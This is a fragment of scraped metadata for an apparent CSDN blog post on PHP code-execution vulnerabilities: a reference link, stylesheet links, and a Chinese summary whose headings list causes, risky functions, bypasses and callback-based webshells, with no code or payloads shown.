【2】https://pplsec.github.io/2019/01/17/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-02-15 15:52:44", "summary": "目录一、漏洞产生的原因二、漏洞产生的常见函数直接利用漏洞源码：闭合绕过模式匿名函数回调函数函数使用示范漏洞测试漏洞复现回调函数一句话木马总结补充动态函数一、漏洞产生的原因脚本语言简洁，方便，但也与此同"}